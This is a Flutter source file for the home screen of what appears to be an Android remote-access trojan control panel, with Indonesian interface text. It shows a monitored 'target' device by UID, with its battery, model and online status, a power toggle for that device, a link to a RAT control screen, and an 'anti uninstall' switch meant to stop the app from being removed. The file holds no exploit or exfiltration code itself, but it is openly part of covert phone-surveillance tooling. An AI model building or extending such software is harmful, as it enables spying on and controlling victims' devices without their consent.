import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';
import 'package:cached_network_image/cached_network_image.dart';
import 'dart:async';
import 'login_screen.dart';
import 'rat_control_screen.dart';
import 'info_screen.dart';
import 'history_screen.dart';
import '../widgets/custom_navbar.dart';
import '../widgets/drawer_widget.dart';
import '../services/config_service.dart';
import '../services/broadcast_receiver.dart';
import '../models/device_model.dart';

class HomeScreen extends StatefulWidget {
  final String username;
  const HomeScreen({super.key, required this.username});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  int _currentIndex = 0;
  late PageController _pageController;
  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;
  bool _antiUninstall = false;
  bool _isTargetOnline = true;
  
  DeviceModel? _targetDevice;
  bool _isLoadingDevice = true;
  
  final String _targetUid = ConfigService.targetUid;

  @override
  void initState() {
    super.initState();
    _pageController = PageController();
    _initVideoPlayer();
    _loadAntiUninstallStatus();
    _initBroadcastListener();
  }

  void _initVideoPlayer() {
    _videoController = VideoPlayerController.networkUrl(Uri.parse('https://files.catbox.moe/qxz3re.mp4'))
      ..initialize().then((_) {
        setState(() => _isVideoInitialized = true);
        _videoController.setLooping(true);
        _videoController.play();
      }).catchError((error) => print('Video error: $error'));
  }

  Future<void> _loadAntiUninstallStatus() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _antiUninstall = prefs.getBool('anti_uninstall') ?? false;
    });
  }

  Future<void> _saveAntiUninstallStatus(bool value) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('anti_uninstall', value);
    setState(() => _antiUninstall = value);
    _showAntiUninstallNotification(value);
  }

  void _initBroadcastListener() {
    BroadcastReceiver.addListener((device) {
      if (mounted && device.uid == _targetUid) {
        setState(() {
          _targetDevice = device;
          _isLoadingDevice = false;
          _isTargetOnline = true;
        });
      }
    });
    
    Timer.periodic(const Duration(seconds: 10), (timer) {
      if (_targetDevice != null) {
        final lastSeen = _targetDevice!.timestamp;
        final difference = DateTime.now().difference(lastSeen);
        if (difference.inSeconds > 15) {
          if (mounted) setState(() => _isTargetOnline = false);
        } else {
          if (mounted) setState(() => _isTargetOnline = true);
        }
      }
    });
  }

  void _toggleDevicePower() {
    setState(() => _isTargetOnline = !_isTargetOnline);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(_isTargetOnline ? '✅ Device dihidupkan' : '🔴 Device dimatikan'),
        backgroundColor: _isTargetOnline ? Colors.green : Colors.red,
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  void _showAntiUninstallNotification(bool enabled) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [Color(0xFF1A1A2E), Color(0xFF2A2A3E)],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: enabled ? Colors.green.withOpacity(0.5) : Colors.red.withOpacity(0.5),
              width: 1.5,
            ),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(
                enabled ? Icons.shield : Icons.shield_outlined,
                color: enabled ? Colors.green : Colors.red,
                size: 60,
              ),
              const SizedBox(height: 16),
              Text(
                enabled ? '🛡️ ANTI UNINSTALL AKTIF' : 'ANTI UNINSTALL NONAKTIF',
                style: TextStyle(
                  color: enabled ? Colors.green : Colors.red,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: (enabled ? Colors.green : Colors.red).withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Text(
                  enabled 
                    ? '🛡️ Aplikasi tidak dapat diuninstall!\n\nSilahkan nonaktifkan fitur ini terlebih dahulu.'
                    : '⚠️ Fitur anti uninstall dimatikan.\nAplikasi sekarang dapat diuninstall.',
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  textAlign: TextAlign.center,
                ),
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: () => Navigator.pop(context),
                style: ElevatedButton.styleFrom(
                  backgroundColor: enabled ? Colors.green : Colors.red,
                  padding: const EdgeInsets.symmetric(horizontal: 32, vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                child: const Text('OK'),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _pageController.dispose();
    _videoController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      drawer: CustomDrawer(
        onHistoryTap: () {
          Navigator.pop(context);
          Navigator.push(context, MaterialPageRoute(builder: (_) => const HistoryScreen()));
        },
        onLogoutTap: () async {
          final prefs = await SharedPreferences.getInstance();
          await prefs.clear();
          if (mounted) {
            Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const LoginScreen()));
          }
        },
      ),
      body: Column(
        children: [
          _buildHeader(),
          _buildVideoPlayer(),
          _buildWelcomeText(),
          _buildDeviceCard(),
          _buildAntiUninstallCard(),
          Expanded(
            child: PageView(
              controller: _pageController,
              onPageChanged: (index) => setState(() => _currentIndex = index),
              children: const [RatControlScreen(), InfoScreen()],
            ),
          ),
          CustomNavbar(
            currentIndex: _currentIndex,
            onTap: (index) {
              setState(() => _currentIndex = index);
              _pageController.jumpToPage(index);
            },
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: const Color(0xFF2A2A3E),
        borderRadius: const BorderRadius.only(bottomLeft: Radius.circular(20), bottomRight: Radius.circular(20)),
        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.2), blurRadius: 10)],
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Scaffold.of(context).openDrawer(),
            child: Column(
              children: [
                Container(width: 24, height: 3, color: Colors.white, margin: const EdgeInsets.only(bottom: 4)),
                Container(width: 18, height: 3, color: Colors.white, margin: const EdgeInsets.only(bottom: 4)),
                Container(width: 12, height: 3, color: Colors.white),
              ],
            ),
          ),
          const Spacer(),
          _buildHeaderIcon(Icons.audiotrack),
          const SizedBox(width: 12),
          _buildHeaderIcon(Icons.person),
        ],
      ),
    );
  }

  Widget _buildHeaderIcon(IconData icon) {
    return Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: const Color(0xFF1A237E).withOpacity(0.3),
        borderRadius: BorderRadius.circular(10),
      ),
      child: Icon(icon, color: const Color(0xFF3949AB), size: 22),
    );
  }

  Widget _buildVideoPlayer() {
    return Container(
      height: 180,
      width: double.infinity,
      margin: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 10, offset: const Offset(0, 4))],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: Stack(
          children: [
            if (_isVideoInitialized && _videoController.value.isInitialized)
              VideoPlayer(_videoController)
            else
              Container(
                color: const Color(0xFF2A2A3E),
                child: const Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      CircularProgressIndicator(color: Color(0xFF3949AB), strokeWidth: 2),
                      SizedBox(height: 12),
                      Text('Loading video...', style: TextStyle(color: Colors.white54, fontSize: 12)),
                    ],
                  ),
                ),
              ),
            Container(decoration: BoxDecoration(gradient: LinearGradient(colors: [Colors.transparent, Colors.black.withOpacity(0.7)], begin: Alignment.topCenter, end: Alignment.bottomCenter))),
            Positioned(
              bottom: 12,
              left: 12,
              child: IconButton(
                icon: Icon(_videoController.value.isPlaying ? Icons.pause_circle : Icons.play_circle, color: Colors.white.withOpacity(0.8), size: 40),
                onPressed: () {
                  if (_videoController.value.isPlaying) { _videoController.pause(); } else { _videoController.play(); }
                  setState(() {});
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildWelcomeText() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Align(
        alignment: Alignment.centerLeft,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('WELCOME BACK,', style: TextStyle(color: Colors.white.withOpacity(0.7), fontSize: 12)),
            Text(widget.username.toUpperCase(), style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceCard() {
    return GestureDetector(
      onTap: () {
        Navigator.push(
          context,
          MaterialPageRoute(builder: (_) => const RatControlScreen()),
        );
      },
      child: Container(
        margin: const EdgeInsets.all(16),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            colors: [Color(0xFF2A2A3E), Color(0xFF1A1A2E)],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: const Color(0xFF3949AB).withOpacity(0.3)),
        ),
        child: Column(
          children: [
            Row(
              children: [
                Container(
                  width: 50,
                  height: 50,
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A237E).withOpacity(0.3),
                    borderRadius: BorderRadius.circular(15),
                  ),
                  child: ConfigService.logoUrl.isNotEmpty
                      ? ClipRRect(
                          borderRadius: BorderRadius.circular(15),
                          child: CachedNetworkImage(
                            imageUrl: ConfigService.logoUrl,
                            fit: BoxFit.cover,
                            placeholder: (context, url) => const Icon(Icons.phone_android, color: Color(0xFF3949AB), size: 30),
                            errorWidget: (context, url, error) => const Icon(Icons.phone_android, color: Color(0xFF3949AB), size: 30),
                          ),
                        )
                      : const Icon(Icons.phone_android, color: Color(0xFF3949AB), size: 30),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _isLoadingDevice ? 'Loading...' : (_targetDevice?.deviceName ?? 'Unknown Device'),
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
                      ),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                            decoration: BoxDecoration(
                              color: const Color(0xFF1A237E).withOpacity(0.3),
                              borderRadius: BorderRadius.circular(10),
                            ),
                            child: Text(
                              'UID: $_targetUid',
                              style: const TextStyle(color: Color(0xFF3949AB), fontSize: 10),
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                            decoration: BoxDecoration(
                              color: const Color(0xFF1A237E).withOpacity(0.3),
                              borderRadius: BorderRadius.circular(10),
                            ),
                            child: Text(
                              'User: ${_targetDevice?.username ?? ConfigService.targetUsername}',
                              style: const TextStyle(color: Color(0xFF3949AB), fontSize: 10),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                const Icon(Icons.chevron_right, color: Colors.white54),
              ],
            ),
            const SizedBox(height: 12),
            Divider(color: Colors.white.withOpacity(0.1)),
            const SizedBox(height: 12),
            Row(
              children: [
                Row(
                  children: [
                    Icon(
                      _targetDevice?.isCharging == true ? Icons.battery_charging_full : Icons.battery_full,
                      color: (_targetDevice?.batteryLevel ?? 0) > 50 
                          ? (_targetDevice?.isCharging == true ? Colors.green : Colors.white)
                          : Colors.orange,
                      size: 20,
                    ),
                    const SizedBox(width: 4),
                    Text(
                      _isLoadingDevice ? '--%' : '${_targetDevice?.batteryLevel ?? 0}%',
                      style: TextStyle(
                        color: (_targetDevice?.batteryLevel ?? 0) > 50 ? Colors.white : Colors.orange,
                        fontSize: 12,
                      ),
                    ),
                    if (_targetDevice?.isCharging == true) ...[
                      const SizedBox(width: 4),
                      const Icon(Icons.flash_on, color: Colors.green, size: 14),
                    ],
                  ],
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: _isTargetOnline ? Colors.green.withOpacity(0.2) : Colors.red.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: _isTargetOnline ? Colors.green : Colors.red,
                      width: 0.5,
                    ),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        width: 8,
                        height: 8,
                        decoration: BoxDecoration(
                          color: _isTargetOnline ? Colors.green : Colors.red,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 4),
                      Text(
                        _isTargetOnline ? 'ONLINE' : 'OFFLINE',
                        style: TextStyle(
                          color: _isTargetOnline ? Colors.green : Colors.red,
                          fontSize: 10,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                GestureDetector(
                  onTap: _toggleDevicePower,
                  child: Container(
                    padding: const EdgeInsets.all(6),
                    decoration: BoxDecoration(
                      color: const Color(0xFF1A237E).withOpacity(0.3),
                      borderRadius: BorderRadius.circular(20),
                    ),
                    child: Icon(
                      Icons.power_settings_new,
                      color: _isTargetOnline ? Colors.green : Colors.red,
                      size: 18,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            if (!_isLoadingDevice && _targetDevice != null)
              Row(
                children: [
                  Icon(Icons.info_outline, color: Colors.white54, size: 12),
                  const SizedBox(width: 4),
                  Text(
                    'Android ${_targetDevice!.androidVersion} • ${_targetDevice!.manufacturer}',
                    style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9),
                  ),
                ],
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildAntiUninstallCard() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: _antiUninstall 
              ? [Colors.green.withOpacity(0.2), Colors.green.withOpacity(0.1)]
              : [const Color(0xFF2A2A3E), const Color(0xFF1A1A2E)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _antiUninstall ? Colors.green.withOpacity(0.5) : const Color(0xFF3949AB).withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: _antiUninstall ? Colors.green.withOpacity(0.2) : const Color(0xFF1A237E).withOpacity(0.3),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(Icons.shield, color: _antiUninstall ? Colors.green : const Color(0xFF3949AB), size: 24),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('🛡️ Anti Uninstall', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
                Text(
                  _antiUninstall ? 'Aplikasi tidak dapat dihapus' : 'Aplikasi dapat dihapus',
                  style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 10),
                ),
              ],
            ),
          ),
          Switch(
            value: _antiUninstall,
            onChanged: (value) => _saveAntiUninstallStatus(value),
            activeColor: Colors.green,
            inactiveThumbColor: const Color(0xFF3949AB),
          ),
        ],
      ),
    );
  }
}